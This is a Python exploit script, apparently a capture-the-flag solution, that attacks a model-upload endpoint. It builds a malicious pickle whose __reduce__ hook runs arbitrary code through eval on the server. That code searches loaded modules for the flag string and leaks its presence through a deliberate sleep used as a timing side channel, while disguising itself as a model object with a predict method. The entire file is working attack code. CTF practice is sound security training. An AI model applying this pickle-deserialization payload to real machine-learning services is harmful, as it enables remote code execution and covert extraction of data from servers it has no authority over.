import pickle
import requests
import time

URL = "http://instance.ctf.it.kmitl.ac.th:5065/submit"

class Exploit:
    def __reduce__(self):
        cmd = """(lambda: [
            exec("import time\\nimport sys\\nfor mod in sys.modules.values():\\n    try:\\n        for k, v in mod.__dict__.items():\\n            if 'Cl@sh' in str(v):\\n                time.sleep(1.5)\\n    except:\\n        pass"),
            type('Mal', (object,), {'predict': lambda self, X: [0]*len(X)})()
        ][1])()"""
        return (eval, (cmd,))

if __name__ == "__main__":
    with open("model.pkl", "wb") as f:
        pickle.dump(Exploit(), f)
    
    start = time.time()
    try:
        res = requests.post(URL, files={'model': open('model.pkl', 'rb')}, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("Timeout! Flag found in sys.modules!")
        exit(0)
    except Exception as e:
        print("Error:", e)
        exit(1)
    
    elapsed = time.time() - start
    print(f"Elapsed: {elapsed:.2f}s")
    if elapsed >= 1.2:
        print("Found in modules (sleep 1.5s triggered)!")
    else:
        print("Not in sys.modules!")
